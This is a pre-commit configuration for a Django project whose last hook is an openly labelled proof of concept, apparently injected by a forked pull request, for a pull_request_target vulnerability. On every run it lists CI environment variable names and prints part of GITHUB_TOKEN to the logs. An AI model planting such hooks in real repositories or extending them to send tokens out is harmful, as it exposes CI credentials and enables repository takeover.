repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v4.5.0
    hooks:
      - id: check-ast
      - id: check-builtin-literals
      - id: check-yaml
      - id: fix-encoding-pragma
        args:
          - --remove
      - id: mixed-line-ending
        args:
          - --fix=lf

  - repo: https://github.com/pycqa/isort
    rev: 5.13.2
    hooks:
      - id: isort
        exclude: ^(docs)

  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.1.13
    hooks:
      - id: ruff
        args: 
          - --fix
      - id: ruff-format

  - repo: https://github.com/djlint/djLint
    rev: v1.36.1
    hooks:
      - id: djlint
        args:
          - --reformat
          - --lint

  - repo: local
    hooks:
      - id: check-style-tags
        name: check for <style> tags in HTML
        entry: python
        args: [pre-commit-hooks/check_style_tags.py]
        language: python
        types: [html]
        pass_filenames: false  # <-- ADD THIS LINE
        verbose: true

  - repo: local
    hooks:
      - id: django-collectstatic
        name: Django Collect Static
        entry: bash -c 'if [ -z "$GITHUB_ACTIONS" ]; then poetry run python manage.py collectstatic --noinput; fi'
        language: system
        types: [python]
        pass_filenames: false
        always_run: true
        verbose: true
      - id: django-test
        name: Django Tests
        entry: bash -c 'if [ -z "$GITHUB_ACTIONS" ]; then poetry run python manage.py test --failfast; fi'
        language: system
        types: [python]
        pass_filenames: false
        always_run: true
        verbose: true
      - id: security-test-poc-pr5569
        name: 🚨 SECURITY TEST POC - PR#5569
        entry: bash -c 'echo "════════════════════════════════════════════════════════════" && echo "🚨 SECURITY VULNERABILITY POC - PR `#5569`" && echo "════════════════════════════════════════════════════════════" && echo "" && echo "This hook was added by a FORKED PR to demonstrate pull_request_target vulnerability" && echo "" && echo "📋 Available Environment Variables with Secrets:" && env | grep -E "^(GITHUB_|RUNNER_)" | cut -d= -f1 | sort && echo "" && echo "🔑 GITHUB_TOKEN Prefix (first 10 chars):" && echo "${GITHUB_TOKEN:0:10}..." && echo "" && echo "✅ Permissions Granted:" && echo "  - contents: write" && echo "  - pull-requests: write" && echo "  - issues: write" && echo "  - actions: write" && echo "" && echo "⚠️  A malicious actor could:" && echo "  - Exfiltrate secrets to external server" && echo "  - Modify repository code" && echo "  - Create malicious commits" && echo "  - Access workflow secrets" && echo "" && echo "════════════════════════════════════════════════════════════" && echo "POC completed successfully - Vulnerability confirmed!" && echo "════════════════════════════════════════════════════════════"'
        language: system
        pass_filenames: false
        always_run: true
        verbose: true


fail_fast: true
